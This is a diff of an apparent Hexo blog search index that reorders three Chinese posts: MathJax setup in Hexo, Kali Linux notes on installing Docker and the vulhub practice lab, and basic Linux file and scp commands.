@@ -62,57 +62,6 @@
       </tags>
   </entry>
   <entry>
-    <title>Hexo博客搭建之结合MathJax插入数学公式</title>
-    <url>/2022/03/17/Hexo%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E4%B9%8B%E7%BB%93%E5%90%88MathJax%E6%8F%92%E5%85%A5%E6%95%B0%E5%AD%A6%E5%85%AC%E5%BC%8F/</url>
-    <content><![CDATA[<h3 id="安装与配置-hexo-math"><a href="#安装与配置-hexo-math" class="headerlink" title="安装与配置 hexo-math"></a>安装与配置 hexo-math</h3><p>首先安装 <a href="https://link.zhihu.com/?target=https://github.com/hexojs/hexo-math">hexo-math</a>插件，该插件使用 <code>MathJax/KaTex</code> 来渲染数学公式:</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">npm install hexo-math --save</span><br></pre></td></tr></table></figure>
-
-<p>安装完成后，配置hexo目录下的 <code>_config.yml</code>，加入下面配置信息：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">math:</span><br><span class="line">  engine: &#x27;mathjax&#x27;</span><br><span class="line">  mathjax:</span><br><span class="line">    src: custom_mathjax_source</span><br><span class="line">    config:</span><br><span class="line">      # MathJax config</span><br></pre></td></tr></table></figure>
-
-<p>然后打开文件 <code>themes/next/_config.yml</code>，搜索关键词 <code>math</code>，将 <code>enable</code> 标签的值改为 <code>true</code>，如下：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mathjax:</span><br><span class="line">  enable: true</span><br><span class="line">  per_page: false</span><br><span class="line">  cdn: //cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML</span><br></pre></td></tr></table></figure>
-
-<h3 id="更改-Hexo-渲染引擎"><a href="#更改-Hexo-渲染引擎" class="headerlink" title="更改 Hexo 渲染引擎"></a>更改 Hexo 渲染引擎</h3><p>Hexo 的默认渲染引擎是 <code>hexo-renderer-marked</code>，需要将它替换为 <code>hexo-renderer-kramed</code><br>在安装 <code>hexo-renderer-kramed</code> 之前，需要卸载 <code>hexo-renderer-marked</code>，顺序执行以下两行命令完成卸载与安装：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ npm uninstall hexo-renderer-marked --save</span><br><span class="line">$ npm install hexo-renderer-kramed --save</span><br></pre></td></tr></table></figure>
-
-<h3 id="解决语义冲突"><a href="#解决语义冲突" class="headerlink" title="解决语义冲突"></a>解决语义冲突</h3><p>在 markdown 中，斜体用下划线 <code>_</code> 或星号 <code>*</code> 表示，而在 <code>LaTex</code> 中，下划线 <code>_</code> 表示下标，为了解决这个冲突，需要修改两处：<br>在博客根目录下，进入 <code>node_modules\kramed\lib\rules\inline.js</code> ，修改第 11 行 <code>escape</code> 变量的值（这一步是在原基础上对 <code>,&#123;,&#125;</code> 的 <code>转义(escape)</code> ）：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">修改前：escape: /^\\([\\`*&#123;&#125;\[\]()#$+\-.!_&gt;])/,</span><br><span class="line">修改后：escape: /^\\([`*\[\]()#$+\-.!_&gt;])/,</span><br></pre></td></tr></table></figure>
-
-<p>同时，把第20行的em变量也做相应的修改：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">修改前：em: /^\b_((?:__|[\s\S])+?)_\b|^\*((?:\*\*|[\s\S])+?)\*(?!\*)/,</span><br><span class="line">修改后：em: /^\*((?:\*\*|[\s\S])+?)\*(?!\*)/,</span><br></pre></td></tr></table></figure>
-
-<h3 id="博客打开-MathJax-开关"><a href="#博客打开-MathJax-开关" class="headerlink" title="博客打开 MathJax 开关"></a>博客打开 MathJax 开关</h3><p>最后，在博客的 <code>Front-matter</code> 里，添加一行 <code>mathjax: true</code>，如下：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">---</span><br><span class="line">title: xxxxxxxxxxxxxxx</span><br><span class="line">date: 2020-02-22 15:44:53</span><br><span class="line">tags: xxx</span><br><span class="line">mathjax: true</span><br><span class="line">---</span><br></pre></td></tr></table></figure>
-
-<p>因为不是每次都需要使用，我在模版 <code>/scaffolds/draft.md</code> 里面添加了 <code>mathjax: false</code>，需要使用的时候再手动更改为 <code>true</code> 即可。</p>
-<h3 id="Markdown-勾选内联公式"><a href="#Markdown-勾选内联公式" class="headerlink" title="Markdown 勾选内联公式"></a>Markdown 勾选内联公式</h3><p>博客写作采用的<a href="https://sspai.com/post/64488">One Markdown</a>软件，直接支持数学公式，不需要进行配置</p>
-<p>平时记笔记写周报用的<a href="https://www.typora.net/">Typora</a>软件，需要手动修改一下设置勾选：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">文件 -&gt; 偏好设置 -&gt; Markdown -&gt; 内联公式</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/03/17/Hexo%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E4%B9%8B%E7%BB%93%E5%90%88MathJax%E6%8F%92%E5%85%A5%E6%95%B0%E5%AD%A6%E5%85%AC%E5%BC%8F/Typora-File.jpg" alt="settings"><br><img src="/2022/03/17/Hexo%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E4%B9%8B%E7%BB%93%E5%90%88MathJax%E6%8F%92%E5%85%A5%E6%95%B0%E5%AD%A6%E5%85%AC%E5%BC%8F/Markdown-settings.jpg" alt="settings"></p>
-<h3 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h3><blockquote>
-<p>公式单行居中显示</p>
-</blockquote>
-<p><code>LaTex</code> 公式两端的 <code>$$</code> 表示公式居中显示，键入下面的 <code>LaTex</code> 公式，代码及效果如下：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$$ evidence_&#123;i&#125;=\sum_&#123;j&#125;W_&#123;ij&#125;x_&#123;j&#125;+b_&#123;i&#125; $$</span><br></pre></td></tr></table></figure>
-<p>$$ evidence_{i}=\sum_{j}W_{ij}x_{j}+b_{i} $$</p>
-<blockquote>
-<p>公式嵌入到句子中</p>
-</blockquote>
-<p>若想在一句话中嵌入公式，则只需要在 <code>LaTex</code> 公式两端用一个 <code>$</code>，代码及效果如下：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">在公式 $ evidence_&#123;i&#125;=\sum_&#123;j&#125;W_&#123;ij&#125;x_&#123;j&#125;+b_&#123;i&#125; $ 中，$W_i$ 和 $b_i$ 分别为类别 $i$ 的权值和偏置。</span><br></pre></td></tr></table></figure>
-<p>在公式 $ evidence_{i}=\sum_{j}W_{ij}x_{j}+b_{i} $ 中，$W_i$ 和 $b_i$ 分别为类别 $i$ 的权值和偏置。</p>
-<h3 id="数学公式-LaTex-基本元素语法"><a href="#数学公式-LaTex-基本元素语法" class="headerlink" title="数学公式 LaTex 基本元素语法"></a>数学公式 LaTex 基本元素语法</h3><p>待续。。。</p>
-]]></content>
-      <categories>
-        <category>博客</category>
-      </categories>
-      <tags>
-        <tag>Hexo</tag>
-        <tag>Blog</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Hexo博客搭建之NexT主题美化</title>
     <url>/2021/08/04/Hexo%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E4%B9%8BNexT%E4%B8%BB%E9%A2%98%E7%BE%8E%E5%8C%96/</url>
     <content><![CDATA[<h2 id="安装-NexT"><a href="#安装-NexT" class="headerlink" title="安装 NexT"></a>安装 NexT</h2><p>Hexo 安装主题的方式非常简单，只需要将主题文件拷贝至站点目录的 <code>themes</code> 目录下， 然后修改下配置文件即可，安装步骤如下：</p>
@@ -281,85 +230,6 @@
       <tags>
         <tag>Hexo</tag>
         <tag>Blog</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Kali Linux 笔记整理</title>
-    <url>/2022/07/04/Kali-Linux-%E7%AC%94%E8%AE%B0%E6%95%B4%E7%90%86/</url>
-    <content><![CDATA[<h1 id="kali切换root用户"><a href="#kali切换root用户" class="headerlink" title="kali切换root用户"></a>kali切换root用户</h1><p>新安装的kali是没有设置root用户的，默认登录账号 <code>kali: kali</code> ，首先需要通过指令设置root账号密码，确认密码后可以进行用户切换了:</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 设置root账户密码</span><br><span class="line">sudo passwd root</span><br><span class="line"># 切换root用户</span><br><span class="line">su root</span><br></pre></td></tr></table></figure>
-
-<p>!(1.root切换)[kali切换root用户]</p>
-<h1 id="安装docker和vulhub"><a href="#安装docker和vulhub" class="headerlink" title="安装docker和vulhub"></a>安装docker和vulhub</h1><p>切换到root用户之后，依次输入以下指令做一些准备工作：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">apt-get update</span><br><span class="line">apt-get install -y apt-transport-https ca-certificates</span><br></pre></td></tr></table></figure>
-
-<p>下载docker引擎并查看其版本：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">apt install docker.io</span><br><span class="line">docker -v</span><br><span class="line"></span><br><span class="line"># 启动docker</span><br><span class="line">systemctl start docker </span><br><span class="line"># 查看docker状态</span><br><span class="line">docker ps -a</span><br></pre></td></tr></table></figure>
-
-<p>接下来安装docker-compose并查看其版本：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">apt-get install python3-pip </span><br><span class="line">pip3 install docker-compose</span><br><span class="line">docker-compose -v</span><br></pre></td></tr></table></figure>
-
-<p>下载vulhub：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/vulhub/vulhub.git</span><br></pre></td></tr></table></figure>
-
-<p>进入到vulhub下对应目录启动docker即可成功搭建靶场，启动后运行在浏览器<code>http://your-ip:8080</code>中：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 编译并运行漏洞环境</span><br><span class="line">docker-compose build</span><br><span class="line">docker-compose up -d</span><br><span class="line"></span><br><span class="line"># 关闭靶场</span><br><span class="line">docker-compose down</span><br></pre></td></tr></table></figure>
-
-<h1 id><a href="#" class="headerlink" title></a></h1>]]></content>
-      <categories>
-        <category>笔记</category>
-      </categories>
-      <tags>
-        <tag>Linux</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Linux命令合集</title>
-    <url>/2022/03/14/Linux%E5%91%BD%E4%BB%A4%E5%90%88%E9%9B%86/</url>
-    <content><![CDATA[<h3 id="一、Linux-命令行切换路径"><a href="#一、Linux-命令行切换路径" class="headerlink" title="一、Linux 命令行切换路径"></a>一、Linux 命令行切换路径</h3><h4 id="1-切换目录"><a href="#1-切换目录" class="headerlink" title="1. 切换目录"></a>1. 切换目录</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 进入用户主目录</span><br><span class="line">cd ~</span><br><span class="line"># 返回进入此目录之前所在目录</span><br><span class="line">cd - </span><br><span class="line"># 返回上级目录(若为根目录则显示/,切换后无变化）</span><br><span class="line">cd ..</span><br><span class="line"># 返回上两级目录</span><br><span class="line">cd ../..</span><br></pre></td></tr></table></figure>
-<h4 id="2-显示当前路径"><a href="#2-显示当前路径" class="headerlink" title="2. 显示当前路径"></a>2. 显示当前路径</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 以绝对路径的方式显示用户当前工作目录</span><br><span class="line">pwd</span><br></pre></td></tr></table></figure>
-<h4 id="3-显示路径下目录列表"><a href="#3-显示路径下目录列表" class="headerlink" title="3. 显示路径下目录列表"></a>3. 显示路径下目录列表</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 显示当前目录下非隐藏文件列表</span><br><span class="line">ls</span><br><span class="line"># 显示当前目录下所有文件列表（.开头的即为隐藏文件）</span><br><span class="line">ls -a</span><br><span class="line"># 显示并输出为长格式列表</span><br><span class="line">ls -l</span><br><span class="line"># 以长格式列表排列显示文件大小日期等</span><br><span class="line">ls -lh</span><br></pre></td></tr></table></figure>
-
-<hr>
-<h3 id="二、Linux-命令行复制-移动文件-夹"><a href="#二、Linux-命令行复制-移动文件-夹" class="headerlink" title="二、Linux 命令行复制/移动文件(夹)"></a>二、Linux 命令行复制/移动文件(夹)</h3><h4 id="1-复制单个文件到另一个文件夹"><a href="#1-复制单个文件到另一个文件夹" class="headerlink" title="1. 复制单个文件到另一个文件夹"></a>1. 复制单个文件到另一个文件夹</h4><figure class="highlight plaintext"><figcaption><span>[命令]</span></figcaption><table><tr><td class="code"><pre><span class="line">cp A路径 B路径</span><br></pre></td></tr></table></figure>
-<p>例如复制 <code>A.html</code> 或者 <code>B.jpg</code> 或者 <code>C.word</code> 或 <code>D.zip</code> 或者 <code>E空文件夹</code> 到另一个文件夹 <code>xxx</code> 中，执行命令：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cp /var/www/xin/A.html /usr/xxx/ </span><br></pre></td></tr></table></figure>
-<h4 id="2-复制文件夹到另一个文件夹"><a href="#2-复制文件夹到另一个文件夹" class="headerlink" title="2. 复制文件夹到另一个文件夹"></a>2. 复制文件夹到另一个文件夹</h4><figure class="highlight plaintext"><figcaption><span>[命令]</span></figcaption><table><tr><td class="code"><pre><span class="line">cp -r A路径 B路径</span><br></pre></td></tr></table></figure>
-<p>例如复制 <code>xin</code> 文件夹 到另一个文件夹 <code>xxx</code> 中，执行命令：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cp -r /var/www/xin/ /usr/xxx/ </span><br></pre></td></tr></table></figure>
-<h4 id="3-移动文件-夹-到另一个文件夹"><a href="#3-移动文件-夹-到另一个文件夹" class="headerlink" title="3. 移动文件(夹)到另一个文件夹"></a>3. 移动文件(夹)到另一个文件夹</h4><figure class="highlight plaintext"><figcaption><span>[命令]</span></figcaption><table><tr><td class="code"><pre><span class="line">mv A路径 B路径</span><br></pre></td></tr></table></figure>
-<p>例如移动 <code>A.html</code> 或者 <code>B.jpg</code> 或者 <code>C.word</code> 或 <code>D.zip</code> 或者 <code>xin</code> 文件夹 到另一个文件夹 <code>xxx</code> 中，执行命令：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mv /var/www/xin/A.html /usr/xxx/ </span><br><span class="line">mv /var/www/xin /usr/xxx</span><br></pre></td></tr></table></figure>
-
-<hr>
-<h3 id="三、通过-ssh-拷贝远程-Linux-服务器上文件-夹"><a href="#三、通过-ssh-拷贝远程-Linux-服务器上文件-夹" class="headerlink" title="三、通过 ssh 拷贝远程 Linux 服务器上文件(夹)"></a>三、通过 ssh 拷贝远程 Linux 服务器上文件(夹)</h3><h4 id="1-Mac-拷贝服务器文件到本地"><a href="#1-Mac-拷贝服务器文件到本地" class="headerlink" title="1. Mac 拷贝服务器文件到本地"></a>1. Mac 拷贝服务器文件到本地</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">scp 用户名@IP地址:A路径 B路径</span><br></pre></td></tr></table></figure>
-<p>比如用户 <code>user</code> 拷贝 <code>xxx.xxx.xxx.xxx</code> 服务器上 <code>data.py</code> 文件夹到本地桌面，执行命令：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">scp user@xxx.xxx.xxx.xxx:/home/user/Desktop/data.py /Users/user/Desktop</span><br></pre></td></tr></table></figure>
-
-<h4 id="2-Mac-拷贝本地文件到服务器"><a href="#2-Mac-拷贝本地文件到服务器" class="headerlink" title="2. Mac 拷贝本地文件到服务器"></a>2. Mac 拷贝本地文件到服务器</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">scp A路径 用户名@IP地址:B路径</span><br></pre></td></tr></table></figure>
-<p>比如用户 <code>user</code> 拷贝本地文件 <code>a.jpg</code> 到 <code>xxx.xxx.xxx.xxx</code> 服务器上作为 <code>b.jpg</code>，执行命令：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">scp /Users/xxx/Desktop/a.jpg user@xxx.xxx.xxx.xxx:/home/user/Desktop/Data/b.jpg</span><br></pre></td></tr></table></figure>
-
-<h4 id="3-Mac-拷贝文件夹"><a href="#3-Mac-拷贝文件夹" class="headerlink" title="3. Mac 拷贝文件夹"></a>3. Mac 拷贝文件夹</h4><p>参考以上命令，只需在 <code>scp</code> 后多添加指令参数 <code>–r</code> 即可:</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">scp –r  …</span><br></pre></td></tr></table></figure>
-
-<hr>
-<h3 id="四、Linux-命令行查看-编辑文件"><a href="#四、Linux-命令行查看-编辑文件" class="headerlink" title="四、Linux 命令行查看/编辑文件"></a>四、Linux 命令行查看/编辑文件</h3><p>可以使用 <code>vi</code> 或 <code>vim</code> 查看/编辑文件，后跟文件路径(当前路径直接跟文件名)即可：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vi /path/to/file</span><br></pre></td></tr></table></figure>
-<p>这时就进入了指令模式，可以看见文件内容（如果文件存在的话，如果此文件不存在，该命令会创建文件）</p>
-<ul>
-<li>处于光标之下的字符使用 <code>x</code> 字符删除（仅限指令模式）</li>
-<li>按 <code>i</code> 就进入了 <code>编辑insert</code> 模式，便可以开始编辑文本了</li>
-<li>按 <code>ESC</code> 退出编辑模式</li>
-<li>如果没做修改退出文本，键入 <code>:q</code>；做了修改但不保存文本退出，键入 <code>:q!</code>；做了修改并保存退出文本，键入 <code>:wq</code> </li>
-</ul>
-<p>vi 和 vim 都是 Linux 中的编辑器，不同的是 vim 比较高级，可以视为 vi 的升级版本，vi 使用于文本编辑，vim 更适用于 coding 。</p>
-]]></content>
-      <categories>
-        <category>笔记</category>
-      </categories>
-      <tags>
-        <tag>Linux</tag>
       </tags>
   </entry>
   <entry>
@@ -740,6 +610,136 @@
       </tags>
   </entry>
   <entry>
+    <title>Hexo博客搭建之结合MathJax插入数学公式</title>
+    <url>/2022/03/17/Hexo%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E4%B9%8B%E7%BB%93%E5%90%88MathJax%E6%8F%92%E5%85%A5%E6%95%B0%E5%AD%A6%E5%85%AC%E5%BC%8F/</url>
+    <content><![CDATA[<h3 id="安装与配置-hexo-math"><a href="#安装与配置-hexo-math" class="headerlink" title="安装与配置 hexo-math"></a>安装与配置 hexo-math</h3><p>首先安装 <a href="https://link.zhihu.com/?target=https://github.com/hexojs/hexo-math">hexo-math</a>插件，该插件使用 <code>MathJax/KaTex</code> 来渲染数学公式:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">npm install hexo-math --save</span><br></pre></td></tr></table></figure>
+
+<p>安装完成后，配置hexo目录下的 <code>_config.yml</code>，加入下面配置信息：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">math:</span><br><span class="line">  engine: &#x27;mathjax&#x27;</span><br><span class="line">  mathjax:</span><br><span class="line">    src: custom_mathjax_source</span><br><span class="line">    config:</span><br><span class="line">      # MathJax config</span><br></pre></td></tr></table></figure>
+
+<p>然后打开文件 <code>themes/next/_config.yml</code>，搜索关键词 <code>math</code>，将 <code>enable</code> 标签的值改为 <code>true</code>，如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mathjax:</span><br><span class="line">  enable: true</span><br><span class="line">  per_page: false</span><br><span class="line">  cdn: //cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML</span><br></pre></td></tr></table></figure>
+
+<h3 id="更改-Hexo-渲染引擎"><a href="#更改-Hexo-渲染引擎" class="headerlink" title="更改 Hexo 渲染引擎"></a>更改 Hexo 渲染引擎</h3><p>Hexo 的默认渲染引擎是 <code>hexo-renderer-marked</code>，需要将它替换为 <code>hexo-renderer-kramed</code><br>在安装 <code>hexo-renderer-kramed</code> 之前，需要卸载 <code>hexo-renderer-marked</code>，顺序执行以下两行命令完成卸载与安装：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ npm uninstall hexo-renderer-marked --save</span><br><span class="line">$ npm install hexo-renderer-kramed --save</span><br></pre></td></tr></table></figure>
+
+<h3 id="解决语义冲突"><a href="#解决语义冲突" class="headerlink" title="解决语义冲突"></a>解决语义冲突</h3><p>在 markdown 中，斜体用下划线 <code>_</code> 或星号 <code>*</code> 表示，而在 <code>LaTex</code> 中，下划线 <code>_</code> 表示下标，为了解决这个冲突，需要修改两处：<br>在博客根目录下，进入 <code>node_modules\kramed\lib\rules\inline.js</code> ，修改第 11 行 <code>escape</code> 变量的值（这一步是在原基础上对 <code>,&#123;,&#125;</code> 的 <code>转义(escape)</code> ）：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">修改前：escape: /^\\([\\`*&#123;&#125;\[\]()#$+\-.!_&gt;])/,</span><br><span class="line">修改后：escape: /^\\([`*\[\]()#$+\-.!_&gt;])/,</span><br></pre></td></tr></table></figure>
+
+<p>同时，把第20行的em变量也做相应的修改：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">修改前：em: /^\b_((?:__|[\s\S])+?)_\b|^\*((?:\*\*|[\s\S])+?)\*(?!\*)/,</span><br><span class="line">修改后：em: /^\*((?:\*\*|[\s\S])+?)\*(?!\*)/,</span><br></pre></td></tr></table></figure>
+
+<h3 id="博客打开-MathJax-开关"><a href="#博客打开-MathJax-开关" class="headerlink" title="博客打开 MathJax 开关"></a>博客打开 MathJax 开关</h3><p>最后，在博客的 <code>Front-matter</code> 里，添加一行 <code>mathjax: true</code>，如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">---</span><br><span class="line">title: xxxxxxxxxxxxxxx</span><br><span class="line">date: 2020-02-22 15:44:53</span><br><span class="line">tags: xxx</span><br><span class="line">mathjax: true</span><br><span class="line">---</span><br></pre></td></tr></table></figure>
+
+<p>因为不是每次都需要使用，我在模版 <code>/scaffolds/draft.md</code> 里面添加了 <code>mathjax: false</code>，需要使用的时候再手动更改为 <code>true</code> 即可。</p>
+<h3 id="Markdown-勾选内联公式"><a href="#Markdown-勾选内联公式" class="headerlink" title="Markdown 勾选内联公式"></a>Markdown 勾选内联公式</h3><p>博客写作采用的<a href="https://sspai.com/post/64488">One Markdown</a>软件，直接支持数学公式，不需要进行配置</p>
+<p>平时记笔记写周报用的<a href="https://www.typora.net/">Typora</a>软件，需要手动修改一下设置勾选：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">文件 -&gt; 偏好设置 -&gt; Markdown -&gt; 内联公式</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/03/17/Hexo%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E4%B9%8B%E7%BB%93%E5%90%88MathJax%E6%8F%92%E5%85%A5%E6%95%B0%E5%AD%A6%E5%85%AC%E5%BC%8F/Typora-File.jpg" alt="settings"><br><img src="/2022/03/17/Hexo%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E4%B9%8B%E7%BB%93%E5%90%88MathJax%E6%8F%92%E5%85%A5%E6%95%B0%E5%AD%A6%E5%85%AC%E5%BC%8F/Markdown-settings.jpg" alt="settings"></p>
+<h3 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h3><blockquote>
+<p>公式单行居中显示</p>
+</blockquote>
+<p><code>LaTex</code> 公式两端的 <code>$$</code> 表示公式居中显示，键入下面的 <code>LaTex</code> 公式，代码及效果如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$$ evidence_&#123;i&#125;=\sum_&#123;j&#125;W_&#123;ij&#125;x_&#123;j&#125;+b_&#123;i&#125; $$</span><br></pre></td></tr></table></figure>
+<p>$$ evidence_{i}=\sum_{j}W_{ij}x_{j}+b_{i} $$</p>
+<blockquote>
+<p>公式嵌入到句子中</p>
+</blockquote>
+<p>若想在一句话中嵌入公式，则只需要在 <code>LaTex</code> 公式两端用一个 <code>$</code>，代码及效果如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">在公式 $ evidence_&#123;i&#125;=\sum_&#123;j&#125;W_&#123;ij&#125;x_&#123;j&#125;+b_&#123;i&#125; $ 中，$W_i$ 和 $b_i$ 分别为类别 $i$ 的权值和偏置。</span><br></pre></td></tr></table></figure>
+<p>在公式 $ evidence_{i}=\sum_{j}W_{ij}x_{j}+b_{i} $ 中，$W_i$ 和 $b_i$ 分别为类别 $i$ 的权值和偏置。</p>
+<h3 id="数学公式-LaTex-基本元素语法"><a href="#数学公式-LaTex-基本元素语法" class="headerlink" title="数学公式 LaTex 基本元素语法"></a>数学公式 LaTex 基本元素语法</h3><p>待续。。。</p>
+]]></content>
+      <categories>
+        <category>博客</category>
+      </categories>
+      <tags>
+        <tag>Hexo</tag>
+        <tag>Blog</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Kali Linux 笔记整理</title>
+    <url>/2022/07/04/Kali-Linux-%E7%AC%94%E8%AE%B0%E6%95%B4%E7%90%86/</url>
+    <content><![CDATA[<h1 id="kali切换root用户"><a href="#kali切换root用户" class="headerlink" title="kali切换root用户"></a>kali切换root用户</h1><p>新安装的kali是没有设置root用户的，默认登录账号 <code>kali: kali</code> ，首先需要通过指令设置root账号密码，确认密码后可以进行用户切换了:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 设置root账户密码</span><br><span class="line">sudo passwd root</span><br><span class="line"># 切换root用户</span><br><span class="line">su root</span><br></pre></td></tr></table></figure>
+
+<p>!(1.root切换)[kali切换root用户]</p>
+<h1 id="安装docker和vulhub"><a href="#安装docker和vulhub" class="headerlink" title="安装docker和vulhub"></a>安装docker和vulhub</h1><p>切换到root用户之后，依次输入以下指令做一些准备工作：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">apt-get update</span><br><span class="line">apt-get install -y apt-transport-https ca-certificates</span><br></pre></td></tr></table></figure>
+
+<p>下载docker引擎并查看其版本：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">apt install docker.io</span><br><span class="line">docker -v</span><br><span class="line"></span><br><span class="line"># 启动docker</span><br><span class="line">systemctl start docker </span><br><span class="line"># 查看docker状态</span><br><span class="line">docker ps -a</span><br></pre></td></tr></table></figure>
+
+<p>接下来安装docker-compose并查看其版本：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">apt-get install python3-pip </span><br><span class="line">pip3 install docker-compose</span><br><span class="line">docker-compose -v</span><br></pre></td></tr></table></figure>
+
+<p>下载vulhub：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/vulhub/vulhub.git</span><br></pre></td></tr></table></figure>
+
+<p>进入到vulhub下对应目录启动docker即可成功搭建靶场，启动后运行在浏览器<code>http://your-ip:8080</code>中：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 编译并运行漏洞环境</span><br><span class="line">docker-compose build</span><br><span class="line">docker-compose up -d</span><br><span class="line"></span><br><span class="line"># 关闭靶场</span><br><span class="line">docker-compose down</span><br></pre></td></tr></table></figure>
+
+<h1 id><a href="#" class="headerlink" title></a></h1>]]></content>
+      <categories>
+        <category>笔记</category>
+      </categories>
+      <tags>
+        <tag>Linux</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Linux命令合集</title>
+    <url>/2022/03/14/Linux%E5%91%BD%E4%BB%A4%E5%90%88%E9%9B%86/</url>
+    <content><![CDATA[<h3 id="一、Linux-命令行切换路径"><a href="#一、Linux-命令行切换路径" class="headerlink" title="一、Linux 命令行切换路径"></a>一、Linux 命令行切换路径</h3><h4 id="1-切换目录"><a href="#1-切换目录" class="headerlink" title="1. 切换目录"></a>1. 切换目录</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 进入用户主目录</span><br><span class="line">cd ~</span><br><span class="line"># 返回进入此目录之前所在目录</span><br><span class="line">cd - </span><br><span class="line"># 返回上级目录(若为根目录则显示/,切换后无变化）</span><br><span class="line">cd ..</span><br><span class="line"># 返回上两级目录</span><br><span class="line">cd ../..</span><br></pre></td></tr></table></figure>
+<h4 id="2-显示当前路径"><a href="#2-显示当前路径" class="headerlink" title="2. 显示当前路径"></a>2. 显示当前路径</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 以绝对路径的方式显示用户当前工作目录</span><br><span class="line">pwd</span><br></pre></td></tr></table></figure>
+<h4 id="3-显示路径下目录列表"><a href="#3-显示路径下目录列表" class="headerlink" title="3. 显示路径下目录列表"></a>3. 显示路径下目录列表</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 显示当前目录下非隐藏文件列表</span><br><span class="line">ls</span><br><span class="line"># 显示当前目录下所有文件列表（.开头的即为隐藏文件）</span><br><span class="line">ls -a</span><br><span class="line"># 显示并输出为长格式列表</span><br><span class="line">ls -l</span><br><span class="line"># 以长格式列表排列显示文件大小日期等</span><br><span class="line">ls -lh</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h3 id="二、Linux-命令行复制-移动文件-夹"><a href="#二、Linux-命令行复制-移动文件-夹" class="headerlink" title="二、Linux 命令行复制/移动文件(夹)"></a>二、Linux 命令行复制/移动文件(夹)</h3><h4 id="1-复制单个文件到另一个文件夹"><a href="#1-复制单个文件到另一个文件夹" class="headerlink" title="1. 复制单个文件到另一个文件夹"></a>1. 复制单个文件到另一个文件夹</h4><figure class="highlight plaintext"><figcaption><span>[命令]</span></figcaption><table><tr><td class="code"><pre><span class="line">cp A路径 B路径</span><br></pre></td></tr></table></figure>
+<p>例如复制 <code>A.html</code> 或者 <code>B.jpg</code> 或者 <code>C.word</code> 或 <code>D.zip</code> 或者 <code>E空文件夹</code> 到另一个文件夹 <code>xxx</code> 中，执行命令：</p>
